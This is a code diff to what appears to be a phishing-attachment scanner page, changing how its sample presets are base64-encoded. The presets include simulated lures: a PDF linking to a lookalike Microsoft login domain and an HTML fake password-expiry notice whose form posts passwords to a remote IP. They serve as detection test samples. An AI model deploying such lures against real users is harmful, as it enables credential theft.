@@ -26,42 +26,50 @@ import {
 import { api } from '../services/api';
 import { Link } from 'react-router-dom';
 
+const strToBase64 = (str: string): string => {
+  return btoa(
+    encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, (_, p1) => {
+      return String.fromCharCode(parseInt(p1, 16));
+    })
+  );
+};
+
 const SAMPLE_PRESETS = [
   {
     name: 'Urgent_Invoice_Overdue.pdf',
     type: 'PDF',
     description: 'Simulated PDF invoice containing an embedded URI hyperlink targeting an Office 365 credential harvester.',
     filename: 'Invoice_Overdue_October2026.pdf',
-    contentBase64: Buffer.from(
+    contentBase64: strToBase64(
       `%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [4 0 R] >>\nendobj\n4 0 obj\n<< /Type /Annot /Subtype /Link /A << /Type /Action /S /URI /URI (https://login-microsoftonline-verify.ru/token) >> >>\nendobj\nxref\n0 5\n0000000000 65535 f\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n%%EOF`
-    ).toString('base64')
+    )
   },
   {
     name: 'M365_Password_Expiry.html',
     type: 'HTML',
     description: 'HTML attachment pretending to be an expired session notice with a credential harvest form.',
     filename: 'M365_Password_Expiry.html',
-    contentBase64: Buffer.from(
+    contentBase64: strToBase64(
       `<!DOCTYPE html><html><head><title>Session Expired</title></head><body><h2>Your Microsoft 365 password expires today</h2><p>Click below to verify identity:</p><a href="https://secure-chase-update.top/auth/login.php?token=982471924">Verify Credentials Now</a><form action="http://198.51.100.42:8080/admin/chase-login.php" method="POST"><input type="password" name="pw"/><button type="submit">Submit</button></form></body></html>`
-    ).toString('base64')
+    )
   },
   {
     name: 'Benign_DocuSign_Contract.pdf',
     type: 'PDF',
     description: 'Clean PDF attachment referencing legitimate enterprise signature portal.',
     filename: 'DocuSign_Service_Agreement.pdf',
-    contentBase64: Buffer.from(
+    contentBase64: strToBase64(
       `%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /Annots [4 0 R] >>\nendobj\n4 0 obj\n<< /Type /Annot /Subtype /Link /A << /Type /Action /S /URI /URI (https://docusign.com/terms) >> >>\nendobj\nxref\n0 5\n0000000000 65535 f\ntrailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n%%EOF`
-    ).toString('base64')
+    )
   },
   {
     name: 'Corporate_Security_Advisory.txt',
     type: 'TXT',
     description: 'Security advisory text containing defanged phishing indicators and active URLs.',
     filename: 'Advisory_FIN7_IOCs.txt',
-    contentBase64: Buffer.from(
+    contentBase64: strToBase64(
       `Security Incident Advisory\nObserved command & control infrastructure:\nhxxps://login[.]paypal[.]com-verify-account[.]live/signin\nAlso visit https://example.com for benign verification.`
-    ).toString('base64')
+    )
   }
 ];
 
@@ -135,7 +143,7 @@ export const AttachmentScannerPage: React.FC = () => {
   const handleApplyPreset = (preset: typeof SAMPLE_PRESETS[0]) => {
     setErrorMsg(null);
     setResult(null);
-    const byteLength = Buffer.from(preset.contentBase64, 'base64').length;
+    const byteLength = atob(preset.contentBase64).length;
     setSelectedFile({
       filename: preset.filename,
       base64: preset.contentBase64,
